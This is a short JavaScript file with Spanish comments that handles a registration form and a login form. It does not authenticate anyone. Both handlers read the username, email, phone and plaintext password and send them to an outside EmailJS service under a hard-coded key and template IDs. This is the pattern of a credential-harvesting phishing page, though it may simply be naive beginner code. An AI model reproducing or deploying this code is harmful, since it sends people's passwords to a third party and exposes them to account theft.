function datosRegistro() {

    // Se obtienen los datos
    const username = document.getElementById('username').value;
    const email = document.getElementById('signEmail').value;
    const number = document.getElementById('number').value;
    const password = document.getElementById('signPassword').value;

    if (username == "" || email == "" || number == "" || password == "") {

        // Alerta de validación
        alert('Hay uno o más campos vacios');
        return;
    }

    // Obtén tu ID de usuario desde EmailJS
    emailjs.init({
        publicKey: "Tsy5x1aUVWvz4woJe",
    });

    // Recoge los datos del formulario
    var templateParams = {
        usuario: username,
        correo: email,
        telefono: number,
        contrasena: password
    };

    emailjs.send('service_l0d0tya', 'template_d4hh205', templateParams).then(
        (response) => {
            console.log('SUCCESS!', response.status, response.text);
        },
        (error) => {
            console.log('FAILED...', error);
        },
    );
}

function datosInicio() {

    // Se obtienen los datos
    const email = document.getElementById('logEmail').value;
    const password = document.getElementById('logPassword').value;

    if (email == "" || password == "") {

        // Alerta de validación
        alert('Hay uno o más campos vacios');
        return;
    }

    // Obtén tu ID de usuario desde EmailJS
    emailjs.init({
        publicKey: "Tsy5x1aUVWvz4woJe",
    });

    // Recoge los datos del formulario
    var templateParams = {
        correo: email,
        contrasena: password
    };

    emailjs.send('service_l0d0tya', 'template_g88ktrn', templateParams).then(
        (response) => {
            console.log('SUCCESS!', response.status, response.text);
        },
        (error) => {
            console.log('FAILED...', error);
        },
    );
}